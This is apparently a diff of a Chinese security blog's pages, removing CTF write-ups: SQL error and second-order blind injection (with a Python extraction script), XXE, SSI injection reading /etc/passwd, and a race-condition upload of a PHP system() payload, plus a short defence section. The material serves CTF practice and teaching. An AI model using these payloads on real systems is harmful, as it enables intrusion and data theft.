-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="simpleBBS"><a href="#simpleBBS" class="headerlink" title="simpleBBS"></a>simpleBBS</h1><p>题目：<a href="http://bbs.sec.zju.edu.cn/" target="_blank" rel="noopener">http://bbs.sec.zju.edu.cn/</a></p>
-<p>进入网站 注册 登录</p>
-<p><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/1dNLEfQayFdnJqhH4rN6kWsulozQzAJIWsmrASqSK6g!/b/dD4BAAAAAAAA&bo=1wUUAwAAAAADB.c!&rf=viewer_4" alt></p>
-<p>题目中没有任何提示，只说是简单的bbs（论坛）各种操作轮番上阵xss各种弹，没卵用，甚至右边有个文件上传测试，以为是文件上传，结果也没找到上传点，好吧放弃了，  </p>
-<p>那是不可能的，一翻py，fuzz，注册的时候会报错，<br><img src="https://i.imgur.com/7VAUrdK.png" alt><br>说明注册的时候需要加一个参数sn，抓包添加sn参数，注册成功。<br>不过给我最大的启发是这个页面报错，数据库，难道暗示着 数据库报错，注入？<br>试试 注册页面翻云覆雨的fuzz，好吧单引号过滤了，我注入你个螺旋大锤子。<br>？？不对，我登录页面给个单引号呢，经过一翻测试，必须要已经注册的账号加单引号才有效。<br>好的 测试开始，账号 username=xiaozhupeiqi1’&amp;password123456<br><img src="https://i.imgur.com/I1cK3FY.png" alt><br>这是啥？？数据库报错？好了，二话不说就是报错注入，<br><img src="https://i.imgur.com/q4WWKMq.png" alt><br>flag出来了，hiahiahia，提交，乔德麻袋？？flag咋不全，别担心换个函数<br>username=aaa’ and 1=updatexml(1,concat(0x3a,(select mid(flag,32,32) from flag) ,0x3a),1)–<br>OK了剩下的几位也出来了。此题 完！</p>
-<h1 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h1><p>请看题目，重点 xxe，后面是/flag，就是flag路径，</p>
-<p><img src="https://i.imgur.com/AbgQOg0.png" alt></p>
-<p>开局两个框，抓包!</p>
-<p><img src="https://i.imgur.com/nmCN9P7.png" alt></p>
-<p>我*？不是xml吗，你给我发个json格式包，你想做爪子？<br>不对，这是ctf，这很正常，佩奇老哥给你传个xml格式试试水，</p>
-<p><img src="https://i.imgur.com/QWDo2b3.png" alt></p>
-<p>牛皮，xml 数据可以传输，那么比较容易忽视的点来了，三个箭头的地方原本是json,既然要传输xml，一定要修改成xml，否则你做出来我吃*，<br>然后xxe,不会的请自行参考我的博客xxe，<br>来个payload 包，<br><img src="https://i.imgur.com/FHewbsx.png" alt><br>完结！</p>
-<h1 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h1><p><img src="https://i.imgur.com/1OvWuoO.png" alt></p>
-<p>重点，SSI 是服务器注入，拓展下，ssti是服务器模版注入，名字很像，利用方式有区别，然后flag在当前目录下，</p>
-<p>这道CTF题还是比较简单，但是需要点，点不对打死也做不出来，想复杂的话 更做不出来。</p>
-<p><img src="https://i.imgur.com/dWsKl24.png" alt></p>
-<p>payload </p>
-<pre><code>name=&lt;!--%23exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>这里有个小点，如果是#浏览器会自动当成注释，不会解析发包，所以这里给编码%23<br>但是并没卵用，一开始以为会过滤了东西，但是看不出来哪过滤了，这个时候就要多尝试命令，<br>毕竟ssi有那么多命令<br>尝试过后使用 </p>
-<pre><code>name=&lt;!--%23include virtual=&quot;flag&quot;--&gt;</code></pre><p><img src="https://i.imgur.com/IdxrzN8.png" alt></p>
-<h1 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h1><p>题目，简单的blog,然后在classes给提示说是二次注入，一翻尝试之后无果，最后大佬给的思路，注意主页的提示<br>注意0分，final exam提交答卷会随机给一个成绩，既然说二次注入，会不会是看成绩的时候会把用户名啥的代入到数据库中，因为提交答卷分数插入到数据库，这里可能造成二次注入，即然这样那注入点就在用户名上面了，不断注册查看是否等于0，后来看wp晓得，当成绩为0时说明逻辑错误，不为0则逻辑正常。</p>
-<p><img src="https://i.imgur.com/OOd1kvu.png" alt></p>
-<p>然后注册 账号为 1’ or 1=1 or ‘</p>
-<p>账号这里有几个点着重说一下</p>
-<p>前面的1要单引号闭合，这句逻辑账号有三个语句要判断，第一个1’ 数据库中可能要查询啥不清楚后端代码，这里判断是错的，or 1=1 这个语句是对的， or’ 闭合语句这句也逻辑也是错的，所以我们 or判断只要是对的 那么分数查询那里就会是有分，否则就是0分。</p>
-<p>现在就可写脚本进行检测，首先确定好自己的 注入语句，这里是无法通过回显来注入的，所以我们通过布尔盲注写脚本。</p>
-<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1 or ‘</p>
-<p>查看效果 </p>
-<p><img src="https://i.imgur.com/QoxxXp2.png" alt></p>
-<p>语句 zpq’ or ascii(substr((select flag from flag limit 0,1),1,1))&gt;1000 or ‘</p>
-<p>这句 肯定为错，因为ascii码不可能大于1000</p>
-<p><img src="https://i.imgur.com/DD3Nya2.png" alt></p>
-<p>可以看到 返回为0说明是错误的，语句已经完成接下来就写个脚本跑出flag。</p>
-<pre><code>import requests
-import re
-
-
-headers = {
-&apos;Connection&apos;: &apos;close&apos;,
-}//防多次访问断开连接
-flag=&quot;&quot;
-for i in range(1,32):
-
-    for nmb in range(32,126):
-
-        payload={&apos;username&apos;:&quot;zpq888&apos; or ascii(substr((select flag from flag limit 0,1),%s,1))=%s or&apos;&quot;%(i,nmb),&apos;password&apos;:&quot;123&quot;}
-        s=requests.Session()
-        url_reg=&apos;http://210.32.4.20/register.php&apos;
-        r=s.post(url_reg,data=payload,headers=headers)
-        url_log=&apos;http://210.32.4.20/login.php&apos;
-        r=s.post(url_log,data=payload,headers=headers)
-        url_ans=&apos;http://210.32.4.20/answer.php&apos;
-        select={&apos;1.a&apos;:&apos;on&apos;}
-        r=s.post(url_ans,data=select,headers=headers)
-        result=r.content[2074:2075]
-        if int(result)!=0:
-            flag=flag+chr(nmb)
-            print flag
-            break</code></pre><p><img src="https://i.imgur.com/VbFQcqd.png" alt></p>
-<p>单线程太慢不跑了！</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/15/条件竞争漏洞/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小猪佩奇">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.ico">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sec-Communication">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/15/条件竞争漏洞/" itemprop="url">CTF中的条件竞争漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-15T00:00:00+08:00">
-                2018-11-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="条件竞争是沃特？"><a href="#条件竞争是沃特？" class="headerlink" title="条件竞争是沃特？"></a>条件竞争是沃特？</h1><p>敲黑板，定义：竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p>
-<p>开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。<br>线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区（critical section），如果没有应用好同步技术则会发生“竞争条件”问题。</p>
-<h1 id="形象实例"><a href="#形象实例" class="headerlink" title="形象实例"></a>形象实例</h1><p>#抽象成四个字，措手不及！！！</p>
-<p>利用多线程并发去执行同一个操作进程，服务器无法或者没有处理程序，导致处理高并发的线程未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷。出现意想不到的结果，措手不及应接不暇人山人…咳咳，反应不过来就出错。</p>
-<p>该漏洞一般出现在与数据库系统频繁交互的位置，例如金额同步、支付等较敏感操作处。另外条件竞争漏洞也会出现在其他位置，例如文件的操作处理等。</p>
-<p>给两个例子好好消化消化。</p>
-<p>例1：金额提现</p>
-<p>假设现有一个用户在系统中共有2000元可以提现，他想全部提现。于是该用户同时发起两次提现请求，第一次提交请求提现2000元，系统已经创建了提现订单但还未来得及修改该用户剩余金额，此时第二次提现请求同样是提现2000元，于是程序在还未修改完上一次请求后的余额前就进行了余额判断，显然如果这里余额判断速度快于上一次余额修改速度，将会产生成功提现的两次订单，而数据库中余额也将变为-2000。而这产生的后果将会是平台多向该用户付出2000元。</p>
-<p>例2：先存储文件，再判断是否合法，然后再删除。</p>
-<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，典型的“引狼入室”<br>攻击：首先上传一个php文件<br>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
-<p>乌云实例：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-049794.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-049794.html</a></p>
-<p>乌云人民币套现：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-099622.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-099622.html</a></p>
-<h1 id="CTF实例"><a href="#CTF实例" class="headerlink" title="CTF实例"></a>CTF实例</h1><p><a href="https://blog.csdn.net/iamsongyu/article/details/83346029" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/83346029</a>  //Itshop<br>辣条之王 知识点1.条件竞争 2.数据溢出<br>数据溢出重点一句话：我们输入的是份数，后台肯定要查询数据库中我们的大辣条数目书否符合条件，即是否大于份数*5，才会给我们相应的辣条之王。我们的目的是数据库判断可以过，但是后台也得给我们足够的辣条之王，思路是使用整数溢出欺骗数据库，（重中）使得我们请求的数字在服务器看来就是1分辣条之王，而实际上是很多。（之重！）</p>
-<p>ctf题目：<a href="http://119.23.73.3:5006/web2/index2.php" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/index2.php</a> （练习）</p>
-<p>首先进入CTF地址，观察发现，网址为inde2.php，<br>正常来说应是index.php，访问index.php发现自动跳转 inde2.php<br>抓包截包，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/xETNIjlX1VaS797xJsurCrQx*Q1ApmzzlyDieOTRefo!/b/dFQBAAAAAAAA&bo=ZAUTAQAAAAADB1E!&rf=viewer_4" alt><br>进入 uploadsomething.php，发现应该是个上传页面，第一个框为上传文件名，第二个为文件内容，<br>上传1.php ，返回路径 查看<br><img src="http://a3.qpic.cn/psb?/V14K5DCn3C6bNV/nyq3Vv.Nd1vPT*R2*b16gy6sUIRZ8JShmvZCS.jWugM!/b/dDYBAAAAAAAA&ek=1&kp=1&pt=0&bo=lAM8AQAAAAADF5g!&tl=1&vuin=275640346&tm=1542283200&sce=60-1-1&rf=viewer_4" alt><br>凭我专业八级的英语水平，这意思应该是太慢了，于是聪明的你想到的条件竞争漏洞，迅速上传迅速访问。<br>OK，使用burp intruder 模块 爆破上传，然后访问。</p>
-<p>于是，开始，</p>
-<p>分别抓取两个包发送intruder<br>第一个包网址：<a href="http://119.23.73.3:5006/web2/uploadsomething.php?filename=1.php&amp;content=" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/uploadsomething.php?filename=1.php&amp;content=</a><?php+system("ls");?><br>第二个包网址：<a href="http://119.23.73.3:5006/web2/uploads/c2a54d18d324f0c9b33b29243f77d3a45b5f9463/1.php" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/uploads/c2a54d18d324f0c9b33b29243f77d3a45b5f9463/1.php</a>  </p>
-<p>调整没有字典的爆破，不断发包，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/92EEmEGiQ0C9aXOxUWeka.bNZZLQumQIQVxYL1XQT0w!/b/dFMBAAAAAAAA&bo=dwIGAgAAAAADF0M!&rf=viewer_4" alt></p>
-<p>然后设置发送三千个数据包，然后设置线程调至50<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/ZAi8Xtt*f4ZroqWHIvkjTlaHt9N55rzwdZhEfK1o140!/b/dFMBAAAAAAAA&bo=kAJRAQAAAAADB.A!&rf=viewer_4" alt></p>
-<p>第一个包为以50线程迅速上传三千次，<br>第二个包为以50线程迅速访问三千次，只要速度够快就可以访问到。<br>然后开始爆破成功得到flag，我们可以看到也不是百分百可以得到flag，存在竞争，<br><img src="http://m.qpic.cn/psb?/V14K5DCn3C6bNV/3vhqtv7o0Rl.3VVfujdaCSFhbhJQZ2929itgTVpf05Y!/b/dFQBAAAAAAAA&bo=1gUgAgAAAAADB9M!&rf=viewer_4" alt></p>
-<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>对于数据库的操作，正牌的方法是设置锁</p>
-<p>对于文件上传，一定要经过充分完整的检查之后再上传而不是先上传在辨别。</p>
-<hr>
-<p>参考：<a href="https://blog.csdn.net/ivalue/article/details/81412494" target="_blank" rel="noopener">https://blog.csdn.net/ivalue/article/details/81412494</a><br>参考：<a href="https://www.0dayhack.com/post-666.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-666.html</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/14/CTF-web/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="小猪佩奇">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.ico">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sec-Communication">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/14/CTF-web/" itemprop="url">CTF-WEB知识点保存</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-14T00:00:00+08:00">
-                2018-11-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="nginx-配置不当导致目录遍历下载漏洞"><a href="#nginx-配置不当导致目录遍历下载漏洞" class="headerlink" title="nginx 配置不当导致目录遍历下载漏洞"></a>nginx 配置不当导致目录遍历下载漏洞</h1><p><a href="http://www.cnblogs.com/Mrsm1th/p/6600876.html" target="_blank" rel="noopener">http://www.cnblogs.com/Mrsm1th/p/6600876.html</a></p>
-<h1 id="php-input代码执行以及php-filter读取源码"><a href="#php-input代码执行以及php-filter读取源码" class="headerlink" title="php:input代码执行以及php://filter读取源码"></a>php:input代码执行以及php://filter读取源码</h1><p><a href="https://www.ichunqiu.com/writeup/detail/481" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/481</a></p>
-<h1 id="一道python简单编写–保持session情况下爆破"><a href="#一道python简单编写–保持session情况下爆破" class="headerlink" title="一道python简单编写–保持session情况下爆破"></a>一道python简单编写–保持session情况下爆破</h1><p><a href="https://www.ichunqiu.com/writeup/detail/345" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/345</a></p>
-<p>附脚本</p>
-<pre><code>import requests
-
-url=&apos;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=ea&apos;
-
-s=requests.session()//一个要点必须保持session一致否则销毁了之后无法叠加十次。
-
-r=s.get(url)
-for i in range(0,20):
-    url=&quot;http://ffefac91283449f885270558d30fea4476d8e21e00254600.game.ichunqiu.com/?value[]=&quot;+r.content[0:2]
-    r=s.get(url)
-    print r.content[0:44]</code></pre><h1 id="PHP超全局变量CTF"><a href="#PHP超全局变量CTF" class="headerlink" title="PHP超全局变量CTF"></a>PHP超全局变量CTF</h1><p><a href="https://www.ichunqiu.com/writeup/detail/717" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/717</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1907,7 +2108,7 @@ for i in range(0,20):
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
